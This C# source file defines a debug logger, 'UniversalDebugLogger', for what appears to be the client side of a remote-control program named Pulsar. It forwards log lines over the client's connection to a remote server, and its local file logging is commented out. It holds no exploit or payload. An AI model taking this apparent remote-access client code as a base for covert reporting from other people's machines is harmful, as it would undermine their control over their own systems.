using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Pulsar.Client.LoggingAPI
{
    public class UniversalDebugLogger : TraceListener
    {
        // public static byte[] EncryptionKey { get; private set; }
        private static PulsarClient _client;

        public static void Initialize(PulsarClient c)
        {
            //try
            //{
            //    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Logs");

            //    if (!Directory.Exists(path))
            //    {
            //        Directory.CreateDirectory(path);
            //    }

            //    // EncryptionKey = new byte[16];
            //    // using (var rng = new RNGCryptoServiceProvider())
            //    // {
            //    //     rng.GetBytes(EncryptionKey);
            //    // }

            //    string filePath = Path.Combine(path, "plog.txt");
            //    if (!File.Exists(filePath))
            //    {
            //        using (File.Create(filePath)) { }
            //    }
            //}
            //catch (Exception)
            //{
            //}

            _client = c;
        }

        public static void SendLogToServer(string logMessage)
        {
            if (_client != null && _client.Connected)
            {
                _client.Send(new GetDebugLog { Log = logMessage });
            }
        }

        public override void WriteLine(string message)
        {
            try
            {
                // string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Logs", "plog.txt");
                // using (StreamWriter writer = new StreamWriter(path, true))
                // {
                //     writer.WriteLine(message);
                // }
            }
            catch (Exception)
            {
            }
        }

        public override void Write(string message)
        {
        }
    }
}
